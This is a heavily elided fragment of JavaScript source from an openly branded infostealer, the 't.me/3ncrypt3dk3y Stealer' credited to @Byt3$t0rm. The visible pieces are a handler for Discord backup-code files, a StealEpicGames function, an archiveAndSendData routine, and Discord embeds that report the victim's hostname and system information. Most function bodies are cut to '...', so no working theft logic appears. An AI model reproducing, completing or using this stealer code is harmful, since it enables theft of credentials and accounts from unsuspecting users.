        ...
        if (currentFile === 'discord_backup_codes.txt') {
          ...
          try {
            ...
            const embed = {
              ...
              footer: {
                text: `${user.hostname} | @Byt3$t0rm | t.me/3ncrypt3dk3y`,
                icon_url: 'https://media.discordapp.net/attachments/1283130999915548757/1287239852609245315/pirate.webp?ex=66f0d308&is=66ef8188&hm=9ca26c0a929dca10779bf58125b00b1530c59d80f0705f9ec2682e94bc580c2f&=&format=webp&width=384&height=384',
              },
            };
...
async function StealEpicGames() {
    try {
        ...
        if (fs.existsSync(epicPath)) {
            ...
            const howToUseContent = `<================[t.me/3ncrypt3dk3y Stealer]>================>\n\n
...
async function archiveAndSendData() {
    ...
    try {
        ...
        archive.addZipComment('All the Information was Stealed by T.ME/3ncrypt3dk3y.');
...
try {
    ...
    const combinedInfoEmbed = {
        ...
        color: 0x303037,
        author: {
            name: `${user.hostname} | System Information | @Byt3$t0rm`,
            icon_url: 'https://media.discordapp.net/attachments/1283130999915548757/1287239852609245315/pirate.webp?ex=66f0d308&is=66ef8188&hm=9ca26c0a929dca10779bf58125b00b1530c59d80f0705f9ec2682e94bc580c2f&=&format=webp&width=384&height=384',
        },
        fields: [
            {
